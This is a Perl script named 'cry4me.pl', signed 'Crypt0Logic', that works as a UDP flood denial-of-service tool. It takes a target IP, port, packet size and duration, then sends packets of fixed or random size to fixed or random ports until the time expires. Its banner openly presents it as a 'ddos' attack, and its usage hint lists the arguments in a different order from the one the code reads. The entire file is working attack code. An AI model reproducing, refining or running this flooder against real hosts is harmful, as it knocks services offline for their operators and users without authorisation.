#!/usr/bin/perl
#Created by Crypt0Logic
# Script: cry4me.pl
use Term::ANSIColor;
use Socket;
use strict;
 
print '
';
print "\n";
 
system('clear'); 
if ($#ARGV != 3) {
print color 'bold blue';
print 
<<EOTEXT;
 CRYPT0LOGIC  #Cry4me                                                                
EOTEXT
  print "-You can do ddos at: '1.1.1.1' with '300' secconds '80' using '1000' packets\n\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "We cant connect with $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~To cancel the attack press \'Ctrl-C\'\n\n";
print "|IP|\t\t |Port|\t\t |Packets|\t\t |Time|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "To cancel the attack press 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}